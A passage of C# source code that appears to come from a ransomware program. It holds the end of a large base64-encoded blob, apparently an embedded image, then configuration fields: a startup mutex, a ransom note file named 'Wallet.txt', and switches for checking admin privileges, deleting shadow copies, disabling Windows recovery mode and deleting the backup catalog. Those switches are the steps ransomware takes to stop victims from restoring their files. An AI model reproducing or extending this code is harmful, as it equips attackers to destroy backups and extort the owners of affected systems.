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";

	public static string appMutexStartup = "1qw0ll8p9m8uezhqhyd";

	private static string droppedMessageTextbox = "Wallet.txt";

	private static bool checkAdminPrivilage = true;

	private static bool checkdeleteShadowCopies = true;

	private static bool checkdisableRecoveryMode = true;

	private static bool checkdeleteBackupCatalog = true;

